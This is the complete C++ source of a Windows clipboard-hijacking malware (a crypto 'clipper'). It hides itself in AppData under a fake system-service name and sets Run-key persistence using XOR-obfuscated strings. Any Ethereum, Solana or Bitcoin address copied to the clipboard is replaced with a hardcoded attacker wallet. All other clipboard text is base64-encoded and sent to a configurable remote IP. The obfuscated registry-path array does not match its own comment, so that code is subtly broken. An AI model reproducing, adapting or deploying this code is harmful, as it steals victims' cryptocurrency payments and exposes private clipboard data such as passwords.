#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <regex>
#include <stdexcept>
#include <shlobj.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Shell32.lib")

using namespace std;

bool file_exists(const string &path)
{
    return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

bool copy_to_appdata(string &copied_path_out)
{
    char appdata[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK)
        return false;

    // Create a fake filename or (systemsvc.exe)
    string target_path = string(appdata) + "\\systemsvcc.exe";

    char current_path[MAX_PATH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH);

    if (_stricmp(current_path, target_path.c_str()) == 0)
    {
        copied_path_out = current_path;
        return true;
    }

    if (!CopyFileA(current_path, target_path.c_str(), FALSE))
        return false;

    copied_path_out = target_path;
    return true;
}

string xor_decrypt(const char* data, size_t len, char key = 0x55)
{
    string out;
    out.reserve(len);
    for (size_t i = 0; i < len; ++i)
    {
        out += data[i] ^ key;
    }
    return out;
}

void z0(const string &x1)
{
    HKEY hX;
    
    const char k1[] = { '6' ^ 0x55, '4' ^ 0x55, ' ' ^ 0x55, '8' ^ 0x55, '4' ^ 0x55, '4' ^ 0x55, '0' ^ 0x55, '0' ^ 0x55, 'z' ^ 0x55, 's' ^ 0x55, 'b' ^ 0x55, 'z' ^ 0x55, 'v' ^ 0x55, 'q' ^ 0x55, ' ' ^ 0x55, '3' ^ 0x55, '8' ^ 0x55, 0 }; // Obfuscated: "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    const char v1[] = { 'W' ^ 0x55, 'i' ^ 0x55, 'n' ^ 0x55, 'd' ^ 0x55, 'o' ^ 0x55, 'w' ^ 0x55, 's' ^ 0x55, 'U' ^ 0x55, 'p' ^ 0x55, 'd' ^ 0x55, 'a' ^ 0x55, 't' ^ 0x55, 'e' ^ 0x55, 'S' ^ 0x55, 'e' ^ 0x55, 'r' ^ 0x55, 'v' ^ 0x55, 'i' ^ 0x55, 'c' ^ 0x55, 'e' ^ 0x55, 0 };

    string d1 = xor_decrypt(k1, sizeof(k1) - 1);  // Registry key path
    string a1 = xor_decrypt(v1, sizeof(v1) - 1);  // Registry value name

    auto ROK = RegOpenKeyExA;
    auto RSV = RegSetValueExA;
    auto RCK = RegCloseKey;

    if (ROK(HKEY_CURRENT_USER, d1.c_str(), 0, KEY_SET_VALUE, &hX) == ERROR_SUCCESS)
    {
        RSV(hX, a1.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE *>(x1.c_str()), x1.length() + 1);
        RCK(hX);
    }
}

string check_clipboard()
{
    if (!OpenClipboard(nullptr))
    {
        return {};
    }
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr)
    {
        CloseClipboard();
        return {};
    }

    char *clipboardText = static_cast<char *>(GlobalLock(hData));

    string result;

    if (clipboardText != NULL)
    {
        result = clipboardText;
        GlobalUnlock(hData);
    }
    CloseClipboard();
    return result;
}

bool set_clipboard_text(const string &text)
{
    if (!OpenClipboard(nullptr))
    {
        return false;
    }
    if (!EmptyClipboard())
    {
        CloseClipboard();
        return false;
    }

    HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
    if (hGlobal == nullptr)
    {
        CloseClipboard();
        return false;
    }

    char *buffer = static_cast<char *>(GlobalLock(hGlobal));
    if (buffer == nullptr)
    {
        GlobalFree(hGlobal);
        CloseClipboard();
        return false;
    }

    memcpy(buffer, text.c_str(), text.size() + 1);
    GlobalUnlock(hGlobal);

    if (SetClipboardData(CF_TEXT, hGlobal) == nullptr)
    {
        GlobalFree(hGlobal);
        CloseClipboard();
        return false;
    }

    CloseClipboard();
    return true;
}

int is_wallet(const string &address)
{
    int type;
    regex eth("^0x[a-fA-F0-9]{40}$");
    regex sol_address("^[1-9A-HJ-NP-Za-km-z]{43,44}$");
    regex btc_bech32("^bc1[0-9a-z]{11,71}$");

    if (regex_match(address, eth))
    {
        type = 1;
    }
    else if (regex_match(address, sol_address))
    {
        type = 2;
    }
    else if (regex_match(address, btc_bech32))
    {
        type = 3;
    }
    else
    {
        type = 0;
    }
    return type;
}

string base64_encode(const string &input)
{
    DWORD encoded_size = 0;
    if (!CryptBinaryToStringA(
            (const BYTE *)input.data(),
            input.size(),
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            NULL,
            &encoded_size))
    {
        return "";
    }

    vector<char> encoded(encoded_size);
    if (!CryptBinaryToStringA(
            (const BYTE *)input.data(),
            input.size(),
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            encoded.data(),
            &encoded_size))
    {
        return "";
    }

    return string(encoded.data(), encoded_size - 1);
}

void exfil(const string &data)
{
    const char *user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0";
    HINTERNET hInternet, hConnect;

    string encoded_data = base64_encode(data);
    if (encoded_data.empty())
    {
        return;
    }

    // change this 192.168.68.125:8080 to your ip_address:port or with your domain
    string url = "http://192.168.68.125:8080/d?data=" + encoded_data;

    hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
    {
        return;
    }

    hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect)
    {
        InternetCloseHandle(hInternet);
        return;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main()
{
    string last_clipboard;
    string copied_path;
    if (copy_to_appdata(copied_path))
    {
        z0(copied_path);
    }
    while (true)
    {
        string current = check_clipboard();
        if (current != last_clipboard)
        {
            last_clipboard = current;
            int type = is_wallet(current);
            if (type == 1)
            {
                set_clipboard_text("0xa4ea334C28911239380fC6b4E20320B425281933");
            }
            else if (type == 2)
            {
                set_clipboard_text("78QJrmQTmNScGzCUdoUTJCD54M5KkWWsWpJUbtE6MEYk");
            }
            else if (type == 3)
            {
                set_clipboard_text("bc1qjjhdn9r60h66dhl9zquk74zhdwzx7kj54uq5xn");
            }
            else
            {
                exfil(current);
            }
        }
        Sleep(1000);
    }
    return 0;
}
